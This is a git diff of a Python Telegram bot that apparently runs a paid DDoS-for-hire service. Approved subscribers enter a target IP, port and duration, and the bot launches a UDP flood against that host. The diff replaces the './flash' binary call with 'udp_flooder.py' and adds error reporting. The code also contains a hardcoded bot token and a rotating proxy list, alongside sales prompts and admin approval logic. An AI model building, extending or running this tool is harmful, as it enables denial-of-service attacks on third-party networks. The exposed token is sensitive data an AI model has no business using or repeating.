@@ -14,17 +14,17 @@ from threading import Thread
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
 # --- Database Setup (SQLite) ---
-conn = sqlite3.connect('users.db', check_same_thread=False)
+conn = sqlite3.connect("users.db", check_same_thread=False)
 cursor = conn.cursor()
 
-cursor.execute('''
+cursor.execute("""
 CREATE TABLE IF NOT EXISTS users (
     user_id INTEGER PRIMARY KEY,
     plan INTEGER,
     valid_until TEXT,
     access_count INTEGER
 )
-''')
+""")
 conn.commit()
 
 def get_user(user_id):
@@ -47,14 +47,14 @@ def count_plan(plan):
     return result[0] if result else 0
 
 # --- Bot Configuration ---
-TOKEN = '8653426400:AAHbsHrOwq3u9vHMiZfjrtwTDZqg37-_ERU'
+TOKEN = "8653426400:AAHbsHrOwq3u9vHMiZfjrtmZqg37-_ERU"
 FORWARD_CHANNEL_ID = -1003789613500
 CHANNEL_ID = -1003789613500
 error_channel_id = -1003789613500
 REQUEST_INTERVAL = 1
 blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 bot = telebot.TeleBot(TOKEN)
 
 # --- Asyncio Setup ---
@@ -64,9 +64,26 @@ async def start_asyncio_loop():
     while True:
         await asyncio.sleep(REQUEST_INTERVAL)
 
-async def run_attack_command_async(target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./flash {target_ip} {target_port} {duration}")
-    await process.communicate()
+async def run_attack_command_async(target_ip, target_port, duration, chat_id):
+    try:
+        # Call the new Python UDP flooder script
+        process = await asyncio.create_subprocess_shell(
+            f"python3 udp_flooder.py {target_ip} {target_port} {duration}",
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        stdout, stderr = await process.communicate()
+        
+        output = stdout.decode().strip() or stderr.decode().strip()
+        
+        if output:
+            logging.info(f"UDP Flooder Output: {output}")
+            # Optionally, send the output back to the user
+            # bot.send_message(chat_id, f"`UDP Flooder Output:\n{output}`", parse_mode=\'Markdown\')
+            
+    except Exception as e:
+        logging.error(f"Failed to execute UDP flooder: {e}")
+        bot.send_message(chat_id, f"*Failed to execute attack command: {e}*", parse_mode=\'Markdown\')
 
 def start_asyncio_thread():
     asyncio.set_event_loop(loop)
@@ -103,10 +120,10 @@ def update_proxy():
         "https://80.78.23.49:1080"
     ]
     proxy = random.choice(proxy_list)
-    telebot.apihelper.proxy = {'https': proxy}
+    telebot.apihelper.proxy = {"https": proxy}
     logging.info("Proxy updated successfully.")
 
-@bot.message_handler(commands=['update_proxy'])
+@bot.message_handler(commands=["update_proxy"])
 def update_proxy_command(message):
     try:
         update_proxy()
@@ -118,12 +135,12 @@ def update_proxy_command(message):
 def is_user_admin(user_id, chat_id):
     try:
         status = bot.get_chat_member(chat_id, user_id).status
-        return status in ['administrator', 'creator']
+        return status in ["administrator", "creator"]
     except Exception as e:
         logging.error(f"Admin check failed: {e}")
         return False
 
-@bot.message_handler(commands=['approve', 'disapprove'])
+@bot.message_handler(commands=["approve", "disapprove"])
 def approve_or_disapprove_user(message):
     user_id = message.from_user.id
     chat_id = message.chat.id
@@ -131,11 +148,11 @@ def approve_or_disapprove_user(message):
     cmd_parts = message.text.split()
 
     if not is_admin:
-        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode="Markdown")
         return
 
     if len(cmd_parts) < 2:
-        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode="Markdown")
         return
 
     action = cmd_parts[0]
@@ -143,14 +160,14 @@ def approve_or_disapprove_user(message):
     plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
     days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
 
-    if action == '/approve':
+    if action == "/approve":
         if plan == 1:
             if count_plan(1) >= 99:
-                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
+                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode="Markdown")
                 return
         elif plan == 2:
             if count_plan(2) >= 499:
-                bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
+                bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode="Markdown")
                 return
 
         valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
@@ -160,11 +177,11 @@ def approve_or_disapprove_user(message):
         update_user(target_user_id, 0, "")
         msg_text = f"*User {target_user_id} disapproved and reverted to free.*"
 
-    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
-    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
+    bot.send_message(chat_id, msg_text, parse_mode="Markdown")
+    bot.send_message(CHANNEL_ID, msg_text, parse_mode="Markdown")
 
 # --- Attack Logic ---
-@bot.message_handler(commands=['Attack'])
+@bot.message_handler(commands=["Attack"])
 def attack_command(message):
     user_id = message.from_user.id
     chat_id = message.chat.id
@@ -172,18 +189,18 @@ def attack_command(message):
     try:
         user_data = get_user(user_id)
         if not user_data or user_data[1] == 0:
-            bot.send_message(chat_id, "*You are not approved to use this bot. Please contact the administrator ADMIN -: @Richyst.*", parse_mode='Markdown')
+            bot.send_message(chat_id, "*You are not approved to use this bot. Please contact the administrator ADMIN -: @Richyst.*", parse_mode="Markdown")
             return
 
         if user_data[1] == 1 and count_plan(1) > 99:
-            bot.send_message(chat_id, "*Your Instant Plan 🧡 is currently not available due to limit reached.*", parse_mode='Markdown')
+            bot.send_message(chat_id, "*Your Instant Plan 🧡 is currently not available due to limit reached.*", parse_mode="Markdown")
             return
 
         if user_data[1] == 2 and count_plan(2) > 499:
-            bot.send_message(chat_id, "*Your Instant++ Plan 💥 is currently not available due to limit reached.*", parse_mode='Markdown')
+            bot.send_message(chat_id, "*Your Instant++ Plan 💥 is currently not available due to limit reached.*", parse_mode="Markdown")
             return
 
-        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode="Markdown")
         bot.register_next_step_handler(message, process_attack_command)
     except Exception as e:
         logging.error(f"Error in attack command: {e}")
@@ -192,21 +209,21 @@ def process_attack_command(message):
     try:
         args = message.text.split()
         if len(args) != 3:
-            bot.send_message(message.chat.id, "*ABE SAHI COMMAND DALNA. Please use: /Attack target_ip target_port time*", parse_mode='Markdown')
+            bot.send_message(message.chat.id, "*ABE SAHI COMMAND DALNA. Please use: /Attack target_ip target_port time*", parse_mode="Markdown")
             return
         target_ip, target_port, duration = args[0], int(args[1]), args[2]
 
         if target_port in blocked_ports:
-            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
+            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode="Markdown")
             return
 
-        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
-        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
+        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration, message.chat.id), loop)
+        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode="Markdown")
     except Exception as e:
         logging.error(f"Error in processing attack command: {e}")
 
 # --- General Handlers ---
-@bot.message_handler(commands=['start'])
+@bot.message_handler(commands=["start"])
 def send_welcome(message):
     markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
     btn2 = KeyboardButton("flash")
@@ -215,17 +232,17 @@ def send_welcome(message):
     btn5 = KeyboardButton("Help❓")
     btn6 = KeyboardButton("Contact admin✔️")
     markup.add(btn2, btn6)
-    bot.send_message(message.chat.id, "*Choose an option AUR AGAR BUY NHI KIYA HAI TO BUY KAR AUR ADMIN KO BOL APPROVE KARNE KO ADMIN -: @Richyst:*", reply_markup=markup, parse_mode='Markdown')
+    bot.send_message(message.chat.id, "*Choose an option AUR AGAR BUY NHI KIYA HAI TO BUY KAR AUR ADMIN KO BOL APPROVE KARNE KO ADMIN -: @Richyst:*", reply_markup=markup, parse_mode="Markdown")
 
 @bot.message_handler(func=lambda message: True)
 def handle_message(message):
     if message.text == "Instant Plan 🧡":
-        bot.reply_to(message, "*Instant Plan selected*", parse_mode='Markdown')
+        bot.reply_to(message, "*Instant Plan selected*", parse_mode="Markdown")
     elif message.text == "flash":
-        bot.reply_to(message, "*flash selected*", parse_mode='Markdown')
+        bot.reply_to(message, "*flash selected*", parse_mode="Markdown")
         attack_command(message)
     elif message.text == "Canary Download✔️":
-        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/flashmainchannel/50*", parse_mode='Markdown')
+        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/flashmainchannel/50*", parse_mode="Markdown")
     elif message.text == "My Account🏦":
         user_id = message.from_user.id
         user_data = get_user(user_id)
@@ -240,13 +257,13 @@ def handle_message(message):
                         f"Current Time: {current_time}*")
         else:
             response = "*No account information found. Please contact the administrator.*"
-        bot.reply_to(message, response, parse_mode='Markdown')
+        bot.reply_to(message, response, parse_mode="Markdown")
     elif message.text == "Help❓":
-        bot.reply_to(message, "*Help selected @richyst*", parse_mode='Markdown')
+        bot.reply_to(message, "*Help selected @richyst*", parse_mode="Markdown")
     elif message.text == "Contact admin✔️":
-        bot.reply_to(message, "*Contact admin selected ADMIN -: @richyst / @Mostbet_India_suppt *", parse_mode='Markdown')
+        bot.reply_to(message, "*Contact admin selected ADMIN -: @richyst / @Mostbet_India_suppt *", parse_mode="Markdown")
     else:
-        bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')
+        bot.reply_to(message, "*Invalid option*", parse_mode="Markdown")
 
 if __name__ == "__main__":
     asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
